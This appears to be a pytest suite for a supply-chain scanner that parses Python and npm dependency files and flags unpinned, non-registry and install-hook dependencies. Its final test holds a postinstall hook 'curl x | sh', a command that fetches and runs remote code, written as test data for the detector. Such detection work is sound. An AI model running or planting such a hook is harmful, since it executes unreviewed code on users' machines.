"""Dependency files: requirements, pyproject, package.json, and the lockfile / hook rules (MCP04)."""

from __future__ import annotations

from pathlib import Path

import pytest

from mcp_sift.core.config import ScanConfig
from mcp_sift.core.scanner import scan
from mcp_sift.parsers.dependencies import (
    _is_pinned_npm,
    _is_pinned_pypi,
    _name_from_direct_reference,
    _npm_source,
    _pypi_source,
    is_dependency_file,
    is_lockfile,
    load_dependencies,
)

MCP = ScanConfig(standards=frozenset({"mcp"}), merge_duplicates=False)


def load(tmp_path: Path, name: str, text: str):
    path = tmp_path / name
    path.write_text(text, encoding="utf-8")
    return load_dependencies(path, name)


def by_name(deps):
    return {d.name: d for d in deps}


# --- file names --------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "name", ["requirements.txt", "requirements-dev.txt", "requirements_dev.txt", "pyproject.toml", "package.json"]
)
def test_dependency_file_names(name):
    assert is_dependency_file(name)


@pytest.mark.parametrize("name", ["README.md", "setup.py", "Pipfile", "package-lock.json", "tsconfig.json"])
def test_other_names_are_not_dependency_files(name):
    assert not is_dependency_file(name)


@pytest.mark.parametrize(
    "name",
    ["package-lock.json", "yarn.lock", "pnpm-lock.yaml", "poetry.lock", "uv.lock", "Pipfile.lock", "pdm.lock",
     "npm-shrinkwrap.json", "requirements.lock"],
)
def test_lockfile_names(name):
    assert is_lockfile(name)


def test_unknown_files_load_nothing(tmp_path):
    assert load(tmp_path, "setup.cfg", "[options]\ninstall_requires = requests\n") == ([], [])


def test_unreadable_files_load_nothing(tmp_path):
    assert load_dependencies(tmp_path / "missing.txt", "missing.txt") == ([], [])


# --- source and pinning helpers ----------------------------------------------------------------


@pytest.mark.parametrize(
    ("raw", "source"),
    [
        ("requests==2.31.0", "registry"),
        ("git+https://github.com/o/r.git@main", "vcs"),
        ("github:o/r", "vcs"),
        ("https://example.com/pkg.tar.gz", "url"),
        ("./local/pkg", "path"),
        ("../sibling", "path"),
        ("-e .", "path"),
        ("pkg @ https://example.com/p.whl", "url"),
        ("pkg @ git+https://github.com/o/r", "vcs"),
        ("pkg @ file:///opt/pkg", "path"),
    ],
)
def test_pypi_source(raw, source):
    assert _pypi_source(raw) == source


@pytest.mark.parametrize(("spec", "pinned"), [("==1.0", True), ("===1.0", True), (">=1.0", False), ("~=1.0", False),
                                              ("", False), ("<2", False)])
def test_pypi_pinning(spec, pinned):
    assert _is_pinned_pypi(spec) is pinned


@pytest.mark.parametrize(
    ("spec", "source"),
    [
        ("1.2.3", "registry"),
        ("^1.2.3", "registry"),
        ("git+ssh://git@github.com/o/r.git", "vcs"),
        ("github:o/r", "vcs"),
        ("https://example.com/x.tgz", "url"),
        ("file:../x", "path"),
        ("link:../x", "path"),
    ],
)
def test_npm_source(spec, source):
    assert _npm_source(spec) == source


@pytest.mark.parametrize(
    ("spec", "pinned"),
    [("1.2.3", True), ("v1.2.3", True), ("1.2.3-beta.1", True), ("^1.2.3", False), ("~1.2.3", False),
     (">=1", False), ("*", False), ("latest", False), ("next", False), ("", False), ("1.2", False)],
)
def test_npm_pinning(spec, pinned):
    assert _is_pinned_npm(spec) is pinned


@pytest.mark.parametrize(
    ("line", "name"),
    [
        ("pkg @ https://example.com/p.whl", "pkg"),
        ("git+https://github.com/o/r.git#egg=thing", "thing"),
        ("-e ./libs/mine", "mine"),
        ("https://example.com/files/pkg.tar.gz", "pkg.tar.gz"),
    ],
)
def test_direct_reference_names(line, name):
    assert _name_from_direct_reference(line) == name


# --- requirements.txt --------------------------------------------------------------------------


def test_requirements_pinned_floating_and_extras(tmp_path):
    deps, scripts = load(
        tmp_path, "requirements.txt",
        "requests==2.31.0\nflask>=2.0\nfastapi[all]~=0.100\nplain\n",
    )
    found = by_name(deps)
    assert scripts == []
    assert found["requests"].pinned and found["requests"].spec == "==2.31.0"
    assert not found["flask"].pinned and found["flask"].spec == ">=2.0"
    assert not found["fastapi"].pinned and found["plain"].spec == ""
    assert found["flask"].line == 2 and found["flask"].ecosystem == "pypi"


def test_requirements_ignore_comments_blank_lines_and_include_directives(tmp_path):
    deps, _ = load(
        tmp_path, "requirements.txt",
        "# a comment\n\n-r other.txt\n--requirement more.txt\n-c constraints.txt\n--index-url https://x\n"
        "click==8.1  # trailing comment\n",
    )
    assert [d.name for d in deps] == ["click"] and deps[0].spec == "==8.1"


def test_requirements_direct_references_are_not_registry(tmp_path):
    deps, _ = load(
        tmp_path, "requirements.txt",
        "git+https://github.com/o/r.git#egg=lib\nhttps://example.com/p.tar.gz\n-e ./mine\nok==1.0\n",
    )
    assert [(d.name, d.source) for d in deps] == [
        ("lib", "vcs"), ("p.tar.gz", "url"), ("mine", "path"), ("ok", "registry"),
    ]
    assert all(not d.pinned for d in deps if d.source != "registry")


def test_requirements_skip_lines_that_are_not_requirements(tmp_path):
    deps, _ = load(tmp_path, "requirements.txt", "!!!\n   \n@@@ nonsense\nreal==1\n")
    assert [d.name for d in deps] == ["real"]


# --- pyproject.toml ----------------------------------------------------------------------------


PYPROJECT = '''\
[project]
name = "x"
classifiers = ["Programming Language :: Python :: 3"]
keywords = ["not-a-dependency"]
dependencies = [
  "click>=8.1",
  "rich==13.0",  # pinned
]

[project.optional-dependencies]
dev = ["pytest>=8", "ruff"]

[build-system]
requires = ["hatchling"]

[dependency-groups]
test = ["coverage==7.0"]

[tool.ruff.lint]
select = ["E", "F"]
'''


def test_pyproject_reads_only_arrays_that_install_code(tmp_path):
    deps, _ = load(tmp_path, "pyproject.toml", PYPROJECT)
    found = by_name(deps)
    assert set(found) == {"click", "rich", "pytest", "ruff", "hatchling", "coverage"}
    assert found["rich"].pinned and not found["click"].pinned
    assert "E" not in found and "Programming Language :: Python :: 3" not in found


def test_pyproject_line_numbers_point_at_the_dependency(tmp_path):
    deps, _ = load(tmp_path, "pyproject.toml", PYPROJECT)
    lines = PYPROJECT.splitlines()
    for dep in deps:
        assert dep.name.lower() in lines[dep.line - 1].lower()


def test_pyproject_single_line_array(tmp_path):
    deps, _ = load(tmp_path, "pyproject.toml", '[project]\ndependencies = ["a==1", "b>=2"]\n')
    assert [d.name for d in deps] == ["a", "b"]


def test_pyproject_hash_inside_a_quoted_spec_is_not_a_comment(tmp_path):
    deps, _ = load(
        tmp_path, "pyproject.toml",
        '[project]\ndependencies = [\n  "pkg @ https://example.com/p.whl#sha256=abc",\n]\n',
    )
    assert deps and deps[0].name == "pkg" and deps[0].source == "url"


def test_pyproject_poetry_sections(tmp_path):
    deps, _ = load(
        tmp_path, "pyproject.toml",
        '[tool.poetry.dependencies]\npython = "^3.10"\nrequests = "^2.31"\npinned = "1.2.3"\n'
        'gitdep = { git = "https://github.com/o/r.git", branch = "main" }\n'
        'localdep = { path = "../x" }\nplain = { version = "1.0" }\n\n'
        '[tool.poetry.dev-dependencies]\npytest = "^8"\n',
    )
    found = by_name(deps)
    assert "python" not in found
    assert found["requests"].source == "registry" and not found["requests"].pinned
    assert found["pinned"].pinned
    assert found["gitdep"].source == "vcs" and found["localdep"].source == "path"
    assert found["plain"].source == "registry" and "pytest" in found


def test_pyproject_without_dependencies_is_empty(tmp_path):
    assert load(tmp_path, "pyproject.toml", '[project]\nname = "x"\n') == ([], [])


# --- package.json ------------------------------------------------------------------------------


def test_package_json_sections_sources_and_pinning(tmp_path):
    deps, scripts = load(
        tmp_path, "package.json",
        '{\n  "dependencies": {"a": "1.2.3", "b": "^2.0.0", "c": "github:o/r", "d": "file:../d"},\n'
        '  "devDependencies": {"e": "~1.0.0"},\n  "optionalDependencies": {"f": "https://x.test/f.tgz"}\n}\n',
    )
    found = by_name(deps)
    assert found["a"].pinned and not found["b"].pinned and not found["e"].pinned
    assert (found["c"].source, found["d"].source, found["f"].source) == ("vcs", "path", "url")
    assert all(d.ecosystem == "npm" for d in deps) and scripts == []
    assert found["a"].line == 2


def test_package_json_ignores_malformed_content(tmp_path):
    assert load(tmp_path, "package.json", "{not json") == ([], [])
    assert load(tmp_path, "package.json", "[1, 2]") == ([], [])
    assert load(tmp_path, "package.json", '{"dependencies": ["a"], "scripts": 5}') == ([], [])
    deps, _ = load(tmp_path, "package.json", '{"dependencies": {"a": 1, "b": "2.0.0"}}')
    assert [d.name for d in deps] == ["b"]


def test_package_json_install_hooks_only(tmp_path):
    _, scripts = load(
        tmp_path, "package.json",
        '{"scripts": {"build": "tsc", "postinstall": "node x.js", "prepare": "husky", "test": "jest", "install": " "}}',
    )
    assert sorted(s.name for s in scripts) == ["postinstall", "prepare"]
    assert all(s.line > 0 for s in scripts)


# --- MCP04 end to end --------------------------------------------------------------------------


def mcp04(tmp_path, files: dict[str, str]) -> dict[str, list]:
    for name, text in files.items():
        (tmp_path / name).write_text(text, encoding="utf-8")
    out: dict[str, list] = {}
    for finding in scan(tmp_path, MCP).findings:
        if finding.rule_id.startswith("MCP04"):
            out.setdefault(finding.rule_id, []).append(finding)
    return out


def test_mcp04_001_fires_for_git_url_and_path_dependencies(tmp_path):
    found = mcp04(tmp_path, {"requirements.txt": "git+https://github.com/o/r.git#egg=lib\n./mine\nok==1.0\n"})
    titles = " ".join(f.title for f in found["MCP04-001"])
    assert "lib" in titles and "mine" in titles and "ok" not in titles


def test_mcp04_001_quiet_for_registry_dependencies_and_self_references(tmp_path):
    assert "MCP04-001" not in mcp04(tmp_path, {"requirements.txt": "requests==2.31.0\n-e .\n"})


def test_mcp04_002_fires_for_floating_dependencies_without_a_lockfile(tmp_path):
    found = mcp04(tmp_path, {"requirements.txt": "flask>=2.0\nclick\n"})
    assert "MCP04-002" in found


@pytest.mark.parametrize("lockfile", ["uv.lock", "poetry.lock", "package-lock.json", "yarn.lock"])
def test_mcp04_002_quiet_when_a_lockfile_exists(tmp_path, lockfile):
    assert "MCP04-002" not in mcp04(tmp_path, {"requirements.txt": "flask>=2.0\n", lockfile: "# lock\n"})


def test_mcp04_002_quiet_when_everything_is_pinned(tmp_path):
    assert "MCP04-002" not in mcp04(tmp_path, {"requirements.txt": "flask==2.0.1\nclick==8.1.0\n"})


def test_mcp04_002_groups_findings_per_file(tmp_path):
    found = mcp04(
        tmp_path,
        {"requirements.txt": "a>=1\nb>=1\n", "package.json": '{"dependencies": {"x": "^1.0.0"}}'},
    )
    assert sorted(f.file_path for f in found["MCP04-002"]) == ["package.json", "requirements.txt"]


def test_mcp04_003_fires_for_install_hooks_and_quotes_the_command(tmp_path):
    found = mcp04(tmp_path, {"package.json": '{"scripts": {"postinstall": "curl x | sh"}}'})
    (finding,) = found["MCP04-003"]
    assert "postinstall" in finding.title and finding.metadata["hook"] == "postinstall"
